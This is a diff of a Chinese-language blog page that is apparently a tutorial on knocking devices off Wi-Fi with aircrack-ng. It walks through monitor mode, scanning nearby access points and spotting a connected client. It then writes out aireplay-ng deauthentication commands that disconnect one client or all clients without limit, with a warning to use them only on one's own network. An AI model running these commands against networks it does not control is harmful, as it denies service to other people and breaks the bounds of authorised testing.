@@ -7,7 +7,7 @@
     <title>中斷無線網路的方法 | 無面者小站</title>
     <meta name="viewport" content="width=device-width,minimum-scale=1">
     <meta name="description" content="警告：此方法只能用於自己的無線網路裝置，目的應該是了解無線網路運作，絕對不能造成他人的困擾或損失，我們應該秉持所有人類都是同胞的心態。就算你">
-    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="generator" content="Hugo 0.68.3" />
     
     
       
@@ -36,14 +36,17 @@
     <meta property="og:title" content="中斷無線網路的方法" />
 <meta property="og:description" content="警告：此方法只能用於自己的無線網路裝置，目的應該是了解無線網路運作，絕對不能造成他人的困擾或損失，我們應該秉持所有人類都是同胞的心態。就算你" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://alextrinityblock.github.io/blog/public/post/secure/%E4%B8%AD%E6%96%B7%E7%84%A1%E7%B7%9A%E7%B6%B2%E8%B7%AF%E7%9A%84%E6%96%B9%E6%B3%95/" /><meta property="article:section" content="post" />
+<meta property="og:url" content="https://alextrinityblock.github.io/blog/public/post/secure/%E4%B8%AD%E6%96%B7%E7%84%A1%E7%B7%9A%E7%B6%B2%E8%B7%AF%E7%9A%84%E6%96%B9%E6%B3%95/" />
 <meta property="article:published_time" content="2021-05-03T10:01:49+08:00" />
 <meta property="article:modified_time" content="2021-05-03T10:01:49+08:00" />
-
 <meta itemprop="name" content="中斷無線網路的方法">
-<meta itemprop="description" content="警告：此方法只能用於自己的無線網路裝置，目的應該是了解無線網路運作，絕對不能造成他人的困擾或損失，我們應該秉持所有人類都是同胞的心態。就算你"><meta itemprop="datePublished" content="2021-05-03T10:01:49+08:00" />
-<meta itemprop="dateModified" content="2021-05-03T10:01:49+08:00" />
+<meta itemprop="description" content="警告：此方法只能用於自己的無線網路裝置，目的應該是了解無線網路運作，絕對不能造成他人的困擾或損失，我們應該秉持所有人類都是同胞的心態。就算你">
+<meta itemprop="datePublished" content="2021-05-03T10:01:49&#43;08:00" />
+<meta itemprop="dateModified" content="2021-05-03T10:01:49&#43;08:00" />
 <meta itemprop="wordCount" content="1133">
+
+
+
 <meta itemprop="keywords" content="secure,aircrack,資安,wifi," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="中斷無線網路的方法"/>
 <meta name="twitter:description" content="警告：此方法只能用於自己的無線網路裝置，目的應該是了解無線網路運作，絕對不能造成他人的困擾或損失，我們應該秉持所有人類都是同胞的心態。就算你"/>
@@ -258,15 +261,15 @@
 Ubuntu/Debian/Linux mint</p>
 <h2 id="1下載無線網路工具aircrack">1.下載無線網路工具aircrack</h2>
 <p>更新軟體庫</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt update
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt update
 </code></pre></div><p>安裝aircrack-ng軟體</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt install aircrack-ng
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt install aircrack-ng
 </code></pre></div><h2 id="2檢查wifi網路卡名稱">2.檢查wifi網路卡名稱</h2>
 <p>找到自己的wifi網路卡名稱</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">iwconfig
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">iwconfig
 </code></pre></div><p>以我的筆電來說無線網卡的開頭名稱常常是wl<br>
 就像這樣(為了安全這裡的數值都更改過，非原數值)</p>
-<pre tabindex="0"><code>wlp3s0    IEEE 802.11  ESSID:&quot;alex&quot;  
+<pre><code>wlp3s0    IEEE 802.11  ESSID:&quot;alex&quot;  
           Mode:Managed  Frequency:2.462 GHz  Access Point: FF:FF:FF:FF:FF:FF   
           Bit Rate=72.2 Mb/s   Tx-Power=15 dBm   
           Retry short limit:7   RTS thr:off   Fragment thr:off
@@ -278,19 +281,19 @@ Ubuntu/Debian/Linux mint</p>
 </code></pre><p>我的網卡名稱是wlp3s0</p>
 <h2 id="3監聽模式">3.監聽模式</h2>
 <p>把網卡切換成監聽模式</p>
-<pre tabindex="0"><code>sudo airmon-ng start wlp3s0(這裡改成你的網卡名稱)
+<pre><code>sudo airmon-ng start wlp3s0(這裡改成你的網卡名稱)
 </code></pre><p>檢查網卡名稱是否變成監聽模式的名稱</p>
-<pre tabindex="0"><code>iwconfig
+<pre><code>iwconfig
 </code></pre><p>來看看我的網卡名稱是否改變</p>
-<pre tabindex="0"><code>wlp3s0mon  IEEE 802.11  Mode:Monitor  Frequency:2.462 GHz  Tx-Power=15 dBm   
+<pre><code>wlp3s0mon  IEEE 802.11  Mode:Monitor  Frequency:2.462 GHz  Tx-Power=15 dBm   
           Retry short limit:7   RTS thr:off   Fragment thr:off
           Power Management:off
 </code></pre><p>我的網卡名稱變成wlp3s0mon了，成功進入監聽模式</p>
 <h2 id="4開始蒐集所有wifi熱點資訊">4.開始蒐集所有wifi熱點資訊</h2>
 <p>顯示監聽結果</p>
-<pre tabindex="0"><code> sudo airodump-ng wlp3s0mon(你的網卡名稱)
+<pre><code> sudo airodump-ng wlp3s0mon(你的網卡名稱)
 </code></pre><p>我們這時可以看到周遭所有啟動的wifi熱點基地台</p>
-<pre tabindex="0"><code> CH  4 ][ Elapsed: 12 s ][ 2021-05-03 11:33 
+<pre><code> CH  4 ][ Elapsed: 12 s ][ 2021-05-03 11:33 
 
  BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
                                               
@@ -300,15 +303,15 @@ Ubuntu/Debian/Linux mint</p>
 我們的目標是alice<br>
 BSSDID是，這有點類似車牌，可是區分出無線網路中的不同裝置 <br>
 alice的熱點的BSSID:</p>
-<pre tabindex="0"><code>EE:EE:EE:AA:AA:AA
+<pre><code>EE:EE:EE:AA:AA:AA
 </code></pre><p>然後這時候看到CH那一欄
 alice的CH(頻道)是:</p>
-<pre tabindex="0"><code>11
+<pre><code>11
 </code></pre><h2 id="5監聽目標wifi熱點">5.監聽目標wifi熱點</h2>
 <p>這時候我們可以來看看有誰連上alice的wifi熱點</p>
-<pre tabindex="0"><code>sudo airodump-ng --bssid EE:EE:EE:AA:AA:AA --channel 11  wlp3s0mon 
+<pre><code>sudo airodump-ng --bssid EE:EE:EE:AA:AA:AA --channel 11  wlp3s0mon 
 </code></pre><p>監聽到的結果</p>
-<pre tabindex="0"><code> CH 11 ][ Elapsed: 8 mins ][ 2021-05-03 11:54 ][ WPA handshake: EE:EE:EE:AA:AA:AA 
+<pre><code> CH 11 ][ Elapsed: 8 mins ][ 2021-05-03 11:54 ][ WPA handshake: EE:EE:EE:AA:AA:AA 
 
  BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 
@@ -318,20 +321,20 @@ alice的CH(頻道)是:</p>
 
  EE:EE:EE:AA:AA:AA  CC:CC:CC:CC:CC:CC  -67    1e- 0e     0      193  EAPOL  alex 
 </code></pre><p>注意看底下STATION那個欄位有一個奇怪的MAC位址：</p>
-<pre tabindex="0"><code>CC:CC:CC:CC:CC:CC
+<pre><code>CC:CC:CC:CC:CC:CC
 </code></pre><p>啊！原來有一個人連上了alice的wifi熱點，他的MAC位址是CC:CC:CC:CC:CC:CC<br>
 我們幫它取名為Peter吧～<br>
 Peter的電腦網卡MAC位置是CC:CC:CC:CC:CC:CC</p>
 <h2 id="6中斷無線網路">6.中斷無線網路</h2>
 <p>我們現在用下面這條指令中斷Peter的連線</p>
-<pre tabindex="0"><code>sudo aireplay-ng --deauth 0 -c CC:CC:CC:CC:CC:CC -a  EE:EE:EE:AA:AA:AA wlp3s0mon
+<pre><code>sudo aireplay-ng --deauth 0 -c CC:CC:CC:CC:CC:CC -a  EE:EE:EE:AA:AA:AA wlp3s0mon
 </code></pre><p>加上註解</p>
-<pre tabindex="0"><code>sudo aireplay-ng --deauth（中斷登入攻擊） 0（0代表無限次） -c CC:CC:CC:CC:CC:CC（被攻擊者peter的MAC位址） -a  EE:EE:EE:AA:AA:AA（alice的wifif熱點ID） wlp3s0mon(網卡名稱)
+<pre><code>sudo aireplay-ng --deauth（中斷登入攻擊） 0（0代表無限次） -c CC:CC:CC:CC:CC:CC（被攻擊者peter的MAC位址） -a  EE:EE:EE:AA:AA:AA（alice的wifif熱點ID） wlp3s0mon(網卡名稱)
 </code></pre><p>如果想要中斷所有使用者</p>
-<pre tabindex="0"><code>sudo aireplay-ng --deauth 0  -a  EE:EE:EE:AA:AA:AA wlp3s0mon
+<pre><code>sudo aireplay-ng --deauth 0  -a  EE:EE:EE:AA:AA:AA wlp3s0mon
 </code></pre><h2 id="7復原自己的無線網路狀態">7.復原自己的無線網路狀態</h2>
 <p>我們測試完畢了，把無線網卡從監聽狀態回復為一般狀態</p>
-<pre tabindex="0"><code>sudo  airmon-ng stop  wlp3s0mon
+<pre><code>sudo  airmon-ng stop  wlp3s0mon
 </code></pre><p>不復原網卡你就無法正常上網</p>
 <ul class="pa0">
   
